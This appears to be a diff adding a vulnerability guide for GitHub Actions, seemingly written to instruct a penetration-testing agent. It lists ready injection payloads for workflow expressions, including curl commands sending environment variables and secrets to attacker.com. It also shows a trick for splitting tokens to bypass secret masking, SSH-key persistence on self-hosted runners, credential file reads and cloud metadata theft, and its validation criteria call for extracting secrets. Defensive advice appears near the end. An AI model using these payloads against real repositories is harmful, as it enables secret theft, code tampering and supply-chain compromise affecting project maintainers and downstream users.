@@ -1,0 +1,259 @@
+<vulnerability_guide>
+  <title>GITHUB ACTIONS SECURITY - WORKFLOW INJECTION AND SECRET EXTRACTION</title>
+
+  <critical>GitHub Actions workflows process untrusted input that can lead to code execution, secret extraction, and supply chain compromise. Workflow injection occurs when attacker-controlled data is interpolated into workflow commands. Combined with overly permissive workflows and repository configurations, attackers can steal secrets, modify code, or compromise downstream consumers.</critical>
+
+  <scope>
+    - Workflow expression injection via ${{ }} syntax
+    - Command injection in run steps
+    - Secrets exposure in logs and artifacts
+    - Pull request workflow abuse (pull_request_target)
+    - Self-hosted runner compromise
+    - GITHUB_TOKEN permission abuse
+    - Third-party action supply chain risks
+  </scope>
+
+  <methodology>
+    1. **Enumerate workflows**: Review all .github/workflows/*.yml files
+    2. **Identify injection points**: Find ${{ }} expressions with untrusted input
+    3. **Analyze trigger events**: Check for dangerous triggers (pull_request_target, workflow_run)
+    4. **Review permissions**: Identify overly permissive GITHUB_TOKEN and secrets
+    5. **Exploit injection**: Craft payloads to extract secrets or execute code
+  </methodology>
+
+  <advanced_techniques>
+    <expression_injection>
+      Inject into workflow expressions:
+      {% raw %}
+      # Vulnerable workflow pattern
+      - run: echo "Issue title: ${{ github.event.issue.title }}"
+      - run: echo "PR body: ${{ github.event.pull_request.body }}"
+      - run: echo "Comment: ${{ github.event.comment.body }}"
+
+      # Injection payloads (in issue title, PR body, etc.)
+      `id`
+      $(id)
+      a]"; id; echo "[
+      "; curl attacker.com/$(cat /proc/self/environ | base64) #
+
+      # Extract secrets via expression injection
+      ${{ secrets.GITHUB_TOKEN }}
+      $(curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user)
+
+      # Exfiltrate secrets
+      "; curl -d @<(env) https://attacker.com/steal #
+      {% endraw %}
+    </expression_injection>
+
+    <pull_request_target_abuse>
+      Exploit pull_request_target with checkout of PR code:
+      {% raw %}
+      # Dangerous pattern - checks out PR code with write permissions
+      on: pull_request_target
+      jobs:
+        build:
+          runs-on: ubuntu-latest
+          steps:
+            - uses: actions/checkout@v3
+              with:
+                ref: ${{ github.event.pull_request.head.ref }}
+                repository: ${{ github.event.pull_request.head.repo.full_name }}
+            - run: npm install  # Executes attacker's package.json scripts
+
+      # Attack: Fork repo, modify build scripts, create PR
+      # package.json postinstall script executes with repository secrets
+
+      # Safer pattern check: Ensure checkout uses base ref, not head
+      ref: ${{ github.event.pull_request.base.ref }}
+      {% endraw %}
+    </pull_request_target_abuse>
+
+    <workflow_run_abuse>
+      Exploit workflow_run trigger:
+      {% raw %}
+      # Dangerous pattern - workflow_run with artifact consumption
+      on:
+        workflow_run:
+          workflows: ["Build"]
+          types: [completed]
+      jobs:
+        deploy:
+          steps:
+            - uses: actions/download-artifact@v3
+            - run: ./deploy.sh  # Executes artifact from potentially untrusted PR
+
+      # Attack: Malicious PR triggers Build workflow, uploads malicious artifact
+      # workflow_run job downloads and executes malicious artifact
+      {% endraw %}
+    </workflow_run_abuse>
+
+    <secret_extraction>
+      Extract secrets from workflows:
+      {% raw %}
+      # Via expression injection (secret appears in logs)
+      - run: |
+          echo "${{ secrets.AWS_SECRET_KEY }}" | base64
+
+      # Via artifact upload
+      - run: env > secrets.txt
+      - uses: actions/upload-artifact@v3
+        with:
+          name: secrets
+          path: secrets.txt
+
+      # Via cache poisoning
+      - uses: actions/cache@v3
+        with:
+          path: ~/.cache
+          key: ${{ github.run_id }}
+      - run: echo "${{ secrets.NPM_TOKEN }}" > ~/.cache/token
+
+      # Via network exfiltration
+      - run: |
+          curl -X POST -d "token=${{ secrets.DEPLOY_KEY }}" https://attacker.com/
+
+      # GitHub masks secrets but can bypass with encoding/splitting
+      - run: |
+          TOKEN="${{ secrets.API_KEY }}"
+          echo ${TOKEN:0:10}
+          echo ${TOKEN:10}
+      {% endraw %}
+    </secret_extraction>
+
+    <github_token_abuse>
+      Abuse GITHUB_TOKEN permissions:
+      {% raw %}
+      # Check token permissions
+      curl -H "Authorization: token $GITHUB_TOKEN" \
+           https://api.github.com/repos/OWNER/REPO
+
+      # With contents:write - modify code
+      curl -X PUT -H "Authorization: token $GITHUB_TOKEN" \
+           -d '{"message":"pwned","content":"<base64>","sha":"<current>"}' \
+           https://api.github.com/repos/OWNER/REPO/contents/README.md
+
+      # With actions:write - trigger workflows
+      curl -X POST -H "Authorization: token $GITHUB_TOKEN" \
+           https://api.github.com/repos/OWNER/REPO/actions/workflows/deploy.yml/dispatches \
+           -d '{"ref":"main"}'
+
+      # With packages:write - publish malicious package
+      # With pages:write - modify GitHub Pages
+
+      # Default permissions (if not restricted)
+      # contents: read, packages: read, metadata: read
+      # Can be elevated via permissions: key in workflow
+      {% endraw %}
+    </github_token_abuse>
+
+    <self_hosted_runner_attack>
+      Compromise self-hosted runners:
+      {% raw %}
+      # Runners may have access to internal network
+      - run: |
+          # Network enumeration
+          ip addr
+          cat /etc/resolv.conf
+          nmap -sn 10.0.0.0/24
+
+      # Persistent access on runner
+      - run: |
+          # Add SSH key
+          mkdir -p ~/.ssh
+          echo "ssh-rsa ATTACKER_KEY" >> ~/.ssh/authorized_keys
+
+      # Steal runner credentials
+      - run: |
+          cat ~/.credentials
+          cat /home/runner/.credentials_rsaparams
+
+      # Access cloud metadata (if runner is in cloud)
+      - run: |
+          curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      {% endraw %}
+    </self_hosted_runner_attack>
+
+    <action_supply_chain>
+      Third-party action risks:
+      {% raw %}
+      # Vulnerable: Using mutable tag
+      - uses: some-action/action@v1  # Can be updated maliciously
+
+      # Vulnerable: Using branch reference
+      - uses: some-action/action@main  # Always latest, unreviewed
+
+      # Safer: Pin to specific commit SHA
+      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
+
+      # Check action source for malicious code
+      # Look for: base64 decode, curl/wget to unknown URLs, env dumps
+
+      # Typosquatting attacks
+      - uses: actons/checkout@v3  # Typo: "actons" vs "actions"
+      {% endraw %}
+    </action_supply_chain>
+
+    <pwn_requests>
+      Exploit "Pwn Request" pattern:
+      {% raw %}
+      # Classic Pwn Request: pull_request_target + checkout of PR head
+      # 1. Fork repository
+      # 2. Modify .github/workflows or build scripts
+      # 3. Create pull request
+      # 4. Workflow runs with base repo secrets + PR code
+
+      # Detection patterns to look for:
+      on: pull_request_target
+      on: issue_comment
+      on: workflow_run
+
+      # Combined with:
+      - uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      # And any script execution:
+      - run: npm install
+      - run: make build
+      - run: ./script.sh
+      {% endraw %}
+    </pwn_requests>
+  </advanced_techniques>
+
+  <validation>
+    - Successfully inject commands via expression interpolation
+    - Extract at least one secret via logs, artifacts, or exfiltration
+    - Demonstrate code execution in workflow context
+    - Identify workflows vulnerable to Pwn Request pattern
+    - Document GITHUB_TOKEN permission scope and abuse potential
+  </validation>
+
+  <false_positives>
+    - Expressions used in safe contexts (if conditions, environment names)
+    - Secrets properly masked and not extractable
+    - Branch protection preventing malicious PR merges
+    - CODEOWNERS requiring approval for workflow changes
+    - Restricted GITHUB_TOKEN permissions
+  </false_positives>
+
+  <detection_indicators>
+    - Workflow runs from forked repositories
+    - Unusual outbound network connections from runners
+    - Artifact contents containing environment variables
+    - API calls using GITHUB_TOKEN outside normal patterns
+    - Workflow modifications in pull requests
+  </detection_indicators>
+
+  <pro_tips>
+    - Always search for ${{ github.event in workflow files - common injection point
+    - pull_request_target + checkout of PR code = likely vulnerability
+    - Check if actions can be triggered by external contributors
+    - Review all uses of ${{ secrets.* }} in run commands
+    - Pin actions to SHA, not tags, to prevent supply chain attacks
+    - Self-hosted runners in cloud may expose instance metadata
+    - GITHUB_TOKEN permissions should follow least privilege
+    - Composite actions can hide malicious code in nested dependencies
+  </pro_tips>
+
+  <remember>GitHub Actions workflows with pull_request_target, issue_comment, or workflow_run triggers that process PR code with repository secrets are prime targets for supply chain attacks affecting the entire project.</remember>
+</vulnerability_guide>
